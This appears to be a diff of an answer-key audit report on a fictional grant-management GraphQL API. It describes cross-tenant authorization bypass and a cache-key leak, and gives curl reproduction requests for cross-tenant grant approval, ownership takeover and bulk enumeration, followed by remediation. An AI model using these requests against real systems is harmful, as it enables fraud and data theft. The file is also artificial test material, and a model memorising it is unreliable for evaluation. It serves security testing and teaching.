@@ -1,79 +1,80 @@
 # Expected Response
 
 ## System
-- Domain: Non-Profit / Grant Management
-- System: GrantFlow CRM API
+- System: GrantFlow CRM API v1.5.8
+- Domain: NON-PROFIT / GRANT MANAGEMENT
 - Example ID: GQL-0427
+- Risk ID: RISK-GQL-427
 
-## Priority Findings
+## Findings
 
-### Finding 1: GraphQL BOLA — Cross-service identity propagation drift (Pattern 1.10)
-**Severity:** Critical
-**Category:** BOLA
+### 1. Pattern 1.10 — Cross-Service Identity Propagation Drift via `updateResource` (HAR Primary)
 
-**Summary:**
-The GraphQL API at `POST /graphql` contains a Pattern 1.10 (Cross-service identity propagation drift) vulnerability.
-An authenticated user belonging to `tenant-8a02` can access or manipulate objects owned by
-`tenant-fbd5` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.
+The `updateResource` mutation accepts a cross-tenant `id` with an `input` including `ownerId`. Pattern 1.10 "cross-service identity propagation drift" — the attacker's identity drifts into the target cross-tenant record via the update: they can approve another nonprofit's grant application AND overwrite its `ownerId` with their own, effectively claiming ownership of a different organization's grant.
+
+HAR shows `updateResource(id: "R-2427", input: {status: "approved", ownerId: "attacker-8a02fbd5"})` from `tenant-8a02`. The response returns `getResource` data for `tenant-fbd5` — synthetic artifact; the authoritative evidence is the mutation operating on a cross-tenant ID and propagating the attacker's `ownerId` into the record.
+
+In Non-Profit / Grant Management: approving another organization's grant application or taking ownership of their approved grant is a financial fraud and fiduciary violation.
 
 **Evidence from HAR:**
-- Request JWT claim `tenantId`: `tenant-8a02`
-- Response body `tenantId`: `tenant-fbd5` — **mismatch confirms cross-tenant data access**
-- Response HTTP status: `200 OK` — no authorization error raised by the resolver
-- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-fbd5`
+- Request: `updateResource(id: "R-2427", input: {status: "approved", ownerId: "attacker-8a02fbd5"})` from `tenant-8a02`
+- `ownerId` in input: `"attacker-8a02fbd5"` — attacker's identity propagated into cross-tenant record
+- Response `tenantId: "tenant-fbd5"` — cross-tenant grant record mutated
+- HTTP status: 200 — identity drift succeeded
 
-**Root Cause:**
-The resolver fetches the resource by `resourceId` directly from the database without joining
-against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
-`tenantId` claim is never used as a WHERE clause predicate.
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Establish attacker baseline
+**Step 1 — Baseline:**
 ```bash
 curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-1427\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
+  -H "x-tenant-id: tenant-8a02" \
+  -d '{"query": "query { getResource(id: \"R-1427\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
 ```
-**Expected baseline:** Returns `tenantId: "tenant-8a02"` — this is the attacker's own object.
+**Expected:** Returns `tenantId: "tenant-8a02"`.
 
-### Step 2 — Cross-tenant ID substitution
+**Step 2 — Cross-tenant grant approval + identity propagation (primary HAR attack):**
 ```bash
 curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-2427\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
+  -H "x-tenant-id: tenant-8a02" \
+  -d '{"query": "mutation { updateResource(id: \"R-2427\", input: {status: \"approved\", ownerId: \"attacker-8a02fbd5\"}) { resourceId tenantId ownerId status } }"}'
 ```
-**Vulnerable outcome:** Returns `tenantId: "tenant-fbd5"` and full `sensitiveField` — **BOLA confirmed**.
-**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.
+**Vulnerable outcome:** Returns `tenantId: "tenant-fbd5"` — another nonprofit's grant application approved; attacker's `ownerId` propagated into the cross-tenant record.
 
-### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
+**Step 3 — Cross-tenant grant read post-update:**
 ```bash
 curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2427\", \"R-3427\", \"R-4427\"]) { resourceId tenantId data { sensitiveField } } }"}'
+  -H "x-tenant-id: tenant-8a02" \
+  -d '{"query": "query { getResource(id: \"R-2427\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
 ```
-**Vulnerable outcome:** Returns objects from multiple tenants in a single response.
+**Vulnerable outcome:** Returns cross-tenant grant data — reading `sensitiveField` after taking ownership (RISK-GQL-427).
 
-### Step 4 — Introspection probe (if Pattern 6.1 also present)
+**Step 4 — Bulk cross-tenant grant enumeration:**
 ```bash
 curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
+  -H "x-tenant-id: tenant-8a02" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2427\", \"R-3427\", \"R-4427\"]) { resourceId tenantId ownerId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.
+**Vulnerable outcome:** Returns grant data from multiple nonprofits.
 
-## Secure Outcome Verification
-For **Step 2**, the secure implementation MUST return:
+### 2. Redis Cache Grant Data Leak
+
+Cache key is `resourceId` only. After the attacker updates `R-2427`, the cached version may serve the tampered grant record (with attacker `ownerId`) to legitimate queries from `tenant-fbd5`.
+
+## Secure Outcome
 ```json
-{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
+{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
 ```
 
 ## Remediation
-1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
-2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
-3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
-4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
+- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-427).
+- Strip `ownerId` from `updateResource` input — server must set `ownerId` from JWT `sub`, never from client input.
+- Per-ID ownership filter in `bulkResourceLookup`.
+- Fix Redis cache key: include `tenantId`.
